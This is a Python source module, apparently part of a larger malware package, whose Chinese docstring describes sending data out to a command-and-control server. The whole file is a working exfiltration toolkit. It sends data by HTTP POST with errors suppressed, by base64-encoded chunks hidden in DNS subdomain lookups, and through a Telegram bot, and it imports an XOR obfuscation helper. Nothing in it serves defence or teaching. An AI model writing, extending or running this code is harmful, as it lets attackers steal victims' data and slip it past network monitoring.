# -*- coding: utf-8 -*-
"""外传数据到C2（纯标准库）"""

import json
import socket
import urllib.request
import urllib.error
import base64
from .crypto import xor_obfuscate

class ExfilChannel:
    @staticmethod
    def via_http(data, url, method="POST", headers=None):
        """HTTP 外传"""
        headers = headers or {"Content-Type": "application/json"}
        if isinstance(data, dict):
            data = json.dumps(data)
        req = urllib.request.Request(url, data=data.encode(), method=method, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.read()
        except Exception:
            return None

    @staticmethod
    def via_dns(data, domain, subdomain_prefix="exfil"):
        """DNS 外传（base64 编码分段）"""
        encoded = base64.b64encode(data.encode()).decode().replace("=", "")
        chunk_size = 63 - len(subdomain_prefix) - len(domain) - 1
        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i+chunk_size]
            fqdn = f"{subdomain_prefix}.{chunk}.{domain}"
            try:
                socket.gethostbyname(fqdn)
            except socket.gaierror:
                pass  # 即使解析失败也算成功（会触发 DNS 查询）

    @staticmethod
    def via_telegram(data, bot_token, chat_id):
        """Telegram Bot 外传"""
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": chat_id, "text": json.dumps(data, indent=2)}
        return ExfilChannel.via_http(payload, url)
